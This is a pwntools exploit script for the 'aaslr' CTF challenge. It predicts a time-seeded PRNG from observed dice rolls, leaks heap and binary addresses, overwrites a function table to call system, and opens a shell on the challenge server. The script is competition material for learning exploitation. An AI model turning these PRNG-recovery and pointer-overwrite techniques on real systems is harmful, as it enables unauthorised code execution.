#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
from time import time
import sys
import socket,ssl

FILENAME = "./aaslr"
LIBCNAME = ""

hosts = ("7b00000026cf3367b031017f.challenges.broker3.allesctf.net","localhost","localhost")
ports = (1337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

realstate = None
ftable_off = None
entry_off = None

def hoge(ix):
  global c
  c.recvuntil("Item:\n")
  c.sendline(str(ix))

def td():
  global c
  hoge(1)
  c.recvuntil("Threw dice: ")
  return int(c.recvline().rstrip())

def _create(data):
  global c
  hoge(2)
  c.recvuntil("100):\n")
  c.send(data)

def _create_state_change(data):
  global realstate
  _create(data)
  realstate = prng(realstate)[1]

def _create_state_change_get_rand(data):
  global realstate
  _create(data)
  val, realstate = prng(realstate)
  return val


def _view(ix):
  global c
  hoge(3)
  c.recvuntil("):\n")
  c.sendline(str(ix))
  c.recvuntil(". ")
  return c.recvline().rstrip()

def _guess():
  global c
  raw_input("NOT IMPLEMENTED")

def prng(state):
    mask=(1<<64)-1
    a,b,c,d=state
    tmp1=a-((b>>5)|((b<<0x1b)&mask))
    tmp1&=mask
    a=b^((c>>0xf)|((c<<0x11)&mask))
    a&=mask
    tmp2=a+tmp1
    tmp2&=mask
    b=c+d
    b&=mask
    c=d+tmp1
    c&=mask
    d=tmp2
    return (tmp2,(a,b,c,d))

def get_malloc_offset(size):
    global realstate
    val, realstate = prng(realstate)
    return val % (0x10000 - size)

def dice(state):
    x,y=prng(state)
    return (x%6+1,y)

def guess_dice(nums):
  hoge(4)
  for i in range(0xf):
    c.recvline()
    c.sendline(str(nums[i]))

def send_many_dices(num):
  if num==0:
    return
  c.recvuntil("Item:\n")
  c.send("1\n"*num)

# 次にお望みのaddr-size~addrを吐くようになるまでdiceを振る
def set_recquestedd_state(req, size, aligend=None):
  global realstate
  global c
  counter = 0
  while True:
    val, realstate = prng(realstate)
    val = val%(0x10000-100)
    if aligend==None or (aligend!=None and val%8==aligend):
        if req-size<= val <=req:
          print("[+] FOUND({}): {}".format(hex(counter), hex(val)))
          print("[+] updating state...")
          '''
          for i in range(counter):
            if i%0x30==0:
                print("   {}".format(hex(i)))
            td()
          '''
          for i in range(counter//0x100):
            print("  sending... : {}".format(hex((i+1)*0x100)))
            send_many_dices(0x100)
          send_many_dices(counter%0x100)
          return val
    counter += 1


## exploit ###########################################

def exploit():
  global c
  global realstate
  global ftable_off
  global entry_off
  cons = 0xf1ea5eed

  nowtime=int(time())
  states = [ (cons,nowtime+i,nowtime+i,nowtime+i)for i in range(-30,31)]
  vptrs = []
  entrys = []
  for i in range(0x16):
    newstates=[]
    for j in states:
        x,y= prng(j)
        newstates.append(y)
        if i==0x14:
          vptrs.append(x)
        elif i==0x15:
          entrys.append(x)
    states=newstates

  while len(states)>1:
    newstates=[]
    newrnds=[]
    newentrys=[]
    x = td()
    for j in range(len(states)):
      i = states[j]
      xx,y=dice(i)
      if xx==x:
        newstates.append(y)
        newrnds.append(vptrs[j])
        newentrys.append(entrys[j])

    states=newstates
    vptrs = newrnds
    entrys = newentrys

  assert(len(states)==1)
  assert(len(vptrs)==1)
  assert(len(entrys)==1)
  realstate = states[0]

  # AASLR1 ####
  guessed = []
  for i in range(0xf):
    x,realstate = prng(realstate)
    x = x%6+1
    guessed += [x]
  guess_dice(guessed)


  # AASLR2 ####
  ftable_off = vptrs[0] % (0x10000 - 0x8)
  entry_off = entrys[0] % (0x10000 - 0x7f8)
  print("[+] ftable_off: {}".format(hex(ftable_off)))
  print("[+] entry_off: {}".format(hex(entry_off)))

  # create dummys
  _create_state_change("A"*0x50+"\n")
  _create_state_change("B"*0x50+"\n")
  _create_state_change("C"*0x50+"\n")

  #
  target_off = entry_off+8*4
  hoge_off = target_off+0x40 - set_recquestedd_state(target_off+0x40, 0x40, aligend=entry_off%8)
  print("[+] target: {}".format(hex(target_off)))
  print("[+] hoge_off: {}".format(hex(hoge_off)))
  _create("X"*0x50 + "\n")
  c.recvuntil("at index ")
  tmpix = int(c.recvline().rstrip())

  fuck = []
  for i in range(0x20):
    fuck.append(_create_state_change_get_rand("Y"*8 + "\n") % (0x10000-100))
  vmaddr1 = unpack(_view(tmpix).ljust(8,b'\x00'))
  print("[+] get: {}".format(hex(vmaddr1)))
  print("[+] fuck: {}".format(hex(fuck[0])))

  # 諦め
  for i in range(len(fuck)):
    print("[+] fuck: {}".format(hex(fuck[i])))
    if (vmaddr1 - fuck[i])%0x100 == 0:
      mmbase = vmaddr1 - fuck[i]
      break
  print("[+] HEAP: {}".format(hex(mmbase)))
  print("[*] ftable: {}".format(hex(ftable_off + mmbase)))
  print("[*] ENTRY: {}".format(hex(entry_off + mmbase)))


  # ftableを読みに行く(textbase leak)
  target_off = entry_off
  hoge_off = target_off - set_recquestedd_state(target_off, 84)
  print("")
  print("[+] target: {}".format(hex(target_off)))
  print("[+] hoge_off: {}".format(hex(hoge_off)))
  _create(b"A"*hoge_off + p64(ftable_off + mmbase)*((100-hoge_off)//8-1) + b"\n")
  c.recvuntil("at index ")
  tmpix = int(c.recvline().rstrip())

  throw_dice_addr = unpack(_view(0).ljust(8,b'\x00'))
  print("[+] throw_dice(): {}".format(hex(throw_dice_addr)))
  textbase = throw_dice_addr - 0x1584
  print("[+] textbase: {}".format(hex(textbase)))

  # overwrite ftable into system
  target_off = ftable_off
  hoge_off = target_off - set_recquestedd_state(target_off, 84-0x10)
  print("")
  print("[+] target: {}".format(hex(target_off)))
  print("[+] hoge_off: {}".format(hex(hoge_off)))
  #_create(b"A"*hoge_off + p64(textbase + 0x1905)*((100-hoge_off)//8-1) + b"\n")
  _create(b"A"*hoge_off + p64(textbase+0x1905)*4 + p64(textbase+0x1afc) + b"\n")
  c.recvuntil("at index ")
  tmpix = int(c.recvline().rstrip())
  
  # jmp to system via error_case() function's entry
  c.recvuntil("Item:\n")
  print("[!] invoking shell...")
  c.sendline("/bin/sh")

  #c.sendline("cat ./flag1")


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = True
        context.load_default_certs()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(s, server_hostname=rhp1["host"])
        ssl_sock.connect((rhp1["host"],rhp1["port"]))
        c = remote.fromsocket(ssl_sock)
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
